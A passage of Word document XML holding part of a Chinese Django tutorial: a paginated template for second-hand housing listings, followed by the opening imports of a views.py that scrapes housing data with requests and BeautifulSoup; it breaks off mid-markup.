    <w:p w14:paraId="6F939DA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9F1FDB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">{# </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注释</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">这里可以换成自己的对象 </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F896309" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;p&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>尚无二手房信息。</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4776B4B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFC72AF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EC7EDE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">{# </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注释</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">下面代码实现分页 </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF8A464" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if is_paginated %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194FD2B0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     &lt;ul class="pagination"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D2EF45" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% if page_obj.has_previous %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F516A6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;li class="page-item"&gt;&lt;a class="page-link" href="?page={{ page_obj.previous_page_number }}"&gt;Previous&lt;/a&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2213EFDF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D512E6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;li class="page-item disabled"&gt;&lt;span class="page-link"&gt;Previous&lt;/span&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B1685B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DFD296" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E38F691" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% for i in paginator.page_range %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A155EF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {% if page_obj.number == i %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F32394D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;li class="page-item active"&gt;&lt;span class="page-link"&gt; {{ i }} &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D34BE9A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       {% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2C0B26" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        &lt;li class="page-item"&gt;&lt;a class="page-link" href="?page={{ i }}"&gt;{{ i }}&lt;/a&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BF4A11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146EEC38" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1595FC58" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F959C99" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">         {% if page_obj.has_next %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E23E722" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;li class="page-item"&gt;&lt;a class="page-link" href="?page={{ page_obj.next_page_number }}"&gt;Next&lt;/a&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E96DA1A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27CA5999" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;li class="page-item disabled"&gt;&lt;span class="page-link"&gt;Next&lt;/span&gt;&lt;/li&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C34BE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8596F5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/ul&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E04D8E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F1E0B8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FA59E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7811E62E" w14:textId="65469CCD" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">{% endblock </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3D16D7" w14:textId="5C415053" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>前端展示效果如下图所示:</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A224FF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7472443E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>爬取数据存入数据库(house_spider)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D38C173" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EB0F73B" w14:textId="7F572524" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46098440" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本章内容是本文最重要的部分。house_spider方法将负责爬取数据并通过Django存入数据库。完整代码如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762361B7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#homelink/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EBD5AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0794A72E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import HouseInfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26067723" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import HouseChoiceForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07702013" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.core.paginator import Paginator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F93BB7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBC0C39" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50014F60" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A5479E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from fake_useragent import UserAgent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7C46AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C35096" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from bs4 import BeautifulSoup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE8E693" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
